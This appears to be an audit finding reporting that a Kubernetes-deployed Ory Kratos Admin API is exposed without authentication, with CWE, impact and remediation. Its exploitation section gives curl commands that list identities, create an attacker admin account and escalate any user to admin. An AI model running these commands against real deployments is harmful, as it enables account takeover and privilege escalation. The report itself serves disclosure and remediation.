# Vulnerability Report: k8s/ory-kratos-pod.yaml

## CRITICAL: Kratos Admin API Exposed Without Authentication on hostPort 4434

**CWE:** CWE-306 — Missing Authentication for Critical Function

**Description:**
The Kratos Admin API is exposed on `hostPort: 4434` (bypassing Traefik) and via Traefik at `/.ory/kratos/admin` with no auth middleware. The Admin API allows creating, reading, updating, and deleting any identity, listing/invalidating sessions, and triggering recovery flows.

**Exploitation Steps:**
```bash
# List all identities (no auth required)
curl http://<target>:4434/admin/identities

# Create a new admin identity
curl -X POST http://<target>:4434/admin/identities \
  -H "Content-Type: application/json" \
  -d '{"schema_id":"default","traits":{"email":"attacker@evil.com","role":"admin"},"credentials":{"password":{"config":{"password":"Attack3r!"}}}}'

# Elevate any user to admin
curl -X PATCH http://<target>:4434/admin/identities/<uuid> \
  -d '[{"op":"replace","path":"/traits/role","value":"admin"}]'
```

**Impact:** Complete identity management access. Create admins, delete accounts, invalidate all sessions (DoS). Full authentication bypass.

**Remediation:** Remove `hostPort: 4434`. Add IP allowlist or forwardAuth middleware to the Traefik admin route.
